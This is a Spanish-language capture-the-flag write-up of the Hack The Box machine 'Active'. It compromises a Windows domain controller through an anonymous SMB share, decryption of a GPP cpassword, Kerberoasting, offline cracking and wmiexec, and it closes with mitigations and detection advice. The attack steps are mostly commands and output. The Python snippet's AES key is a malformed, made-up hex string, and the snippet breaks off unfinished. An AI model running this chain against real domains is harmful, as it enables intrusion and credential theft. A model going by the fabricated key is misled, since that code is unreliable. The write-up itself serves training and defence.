---
machine: Active
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [ad, kerberos, gpp, smb, kerberoasting]
---

# Active — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales: se sustituyen por marcadores.

## TL;DR

Controlador de dominio de Windows Server 2008 R2 (`active.htb`). El SMB permite sesión nula y expone el share `Replication` con una copia de SYSVOL: dentro aparece un `Groups.xml` con una contraseña GPP cifrada, que se descifra al instante porque la clave AES es pública desde 2012 (MS14-025). Con esa cuenta de servicio se hace Kerberoasting y el SPN pertenece a `Administrator`, así que al romper el TGT ya se tiene la cuenta más alta del dominio.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
53/tcp    domain        Microsoft DNS
88/tcp    kerberos-sec  Microsoft Kerberos
135/tcp   msrpc
139/tcp   netbios-ssn
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
593/tcp   ncacn_http
636/tcp   ldapssl
3268/tcp  ldap (Global Catalog)
49152+/tcp msrpc
```

Perfil de DC completo: DNS, Kerberos, LDAP, SMB y RPC. Como no hay web ni FTP, todo el trabajo es de Active Directory.

```bash
echo "<IP> active.htb dc.active.htb" | sudo tee -a /etc/hosts
```

## Enumeración

Sesión nula por SMB:

```bash
smbclient -L //<IP> -N
smbmap -H <IP>
```

Shares: `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL` y **`Replication`**, que no es estándar y huele a copia manual de SYSVOL.

```bash
smbclient //<IP>/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Dentro de la política aparece:

```text
active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

```xml
<Properties action="U" newName="" ... userName="active.htb\SVC_TGS"
            cpassword="<cpassword>" ... />
```

GPP cifra con AES-256 y una clave que Microsoft publicó; no es un hash, es un cifrado reversible.

```bash
gpp-decrypt '<cpassword>'
```

Alternativa sin la herramienta:

```python
from Crypto.Cipher import AES
import base64, binascii
key = binascii.unhexlify('4e9906e8edcdee15f9a8f0d1c2e3a4b5c6d7e8f90112233445566778899aabbccdd')
# relleno PKCS7, IV nulo, AES-CBC
```

Credencial válida: `active.htb\SVC_TGS:<password>`.

## Foothold

No hay servicio expuesto que autentique con esa cuenta, así que se usa para pedir tickets:

```bash
GetUserSPNs.py active.htb/SVC_TGS:'<password>' -dc-ip <IP> -request
```

```text
ServicePrincipalName  Name           MemberOf  PasswordLastSet
--------------------  -------------  --------  ---------------
active/CIFS:445       Administrator            2018-07-18
```

El SPN está registrado en `Administrator`, no en una cuenta de servicio. El TGS-REP va cifrado con su hash y se rompe offline:

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
# o
john hash.txt --format=krb5tgs --wordlist=rockyou.txt
```

## Escalada

No hace falta: la contraseña obtenida es la de `Administrator`. Para ejecutar comandos sin abrir sesión interactiva, `wmiexec` funciona mejor que `psexec` en 2008 R2 (este último suele fallar por SMB signing y por el servicio que crea):

```bash
wmiexec.py active.htb/Administrator:'<password>'@<IP>
```

```text
C:\> whoami
active\administrator
```

## Evidencia

- `whoami` → `active\administrator`.
- Lectura de `C:\Users\Administrator\Desktop\root.txt` (contenido redactado).
- Hash Kerberos de `Administrator` en formato `$krb5tgs$23$` (redactado).

## Lecciones aprendidas

- El share con nombre raro (`Replication`) fue la pista: en un DC, cualquier copia de SYSVOL fuera de `SYSVOL` es un fallo de operación.
- GPP no es criptografía fuerte, es ofuscación con clave conocida. Si aparece `cpassword`, la contraseña es pública.
- En Kerberoasting conviene mirar **quién** tiene el SPN: si es una cuenta privilegiada, el ticket vale más que un foothold.
- `psexec` falla en 2008 R2 con frecuencia; `wmiexec` evita el servicio temporal y el SMB signing.
- La contraseña de GPP estaba reutilizada como contraseña de la cuenta de servicio y del dominio en otro momento: la reutilización encadena fallos.

## Mitigaciones y detección

- Eliminar `cpassword` de todas las GPO (MS14-025) y rotar cualquier contraseña que haya estado ahí.
- Pasar las cuentas de servicio a gMSA, que no tienen contraseña que extraer.
- Deshabilitar RC4 en Kerberos y exigir AES: el Kerberoasting con RC4 es trivial de romper.
- Contraseñas de servicio largas y aleatorias; nada de diccionario.
- Detección: evento 4769 con `TicketEncryptionType 0x17`, peticiones masivas de TGS desde una sola cuenta, lectura de shares SYSVOL desde equipos no administradores.
- MITRE: T1552.006 (GPP), T1558.003 (Kerberoasting), T1078.

## Referencias

- MS14-025: vulnerabilidad en las preferencias de grupo.
- MITRE ATT&CK: T1552.006, T1558.003.
- Documentación de `GetUserSPNs.py` (Impacket).
